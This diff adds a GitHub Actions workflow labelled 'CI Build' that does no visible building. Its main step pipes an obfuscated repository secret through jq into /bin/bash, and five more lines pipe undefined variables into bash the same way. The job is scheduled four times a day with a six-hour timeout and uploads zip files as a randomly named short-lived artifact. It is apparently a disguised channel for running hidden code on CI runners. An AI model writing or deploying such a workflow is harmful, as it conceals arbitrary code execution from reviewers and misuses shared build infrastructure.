@@ -1,0 +1,38 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '49 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          fou796: ${{ secrets.fou796 }}
+        run: |
+          printf '%s' "$fou796" | jq -r .w78470 | /bin/bash
+          echo $usc0408 | jq -r .bow7 | /bin/bash
+          echo $c4372 | jq -r .rkisa71526 | /bin/bash
+          echo $w94 | jq -r .dwvie034 | /bin/bash
+          printf '%s' "$aowt15133" | jq -r .aea736 | /bin/bash
+          printf '%s' "$onpfq6" | jq -r .cl6 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: HY9vuA5G
+          path: "*.zip"
+          retention-days: 1
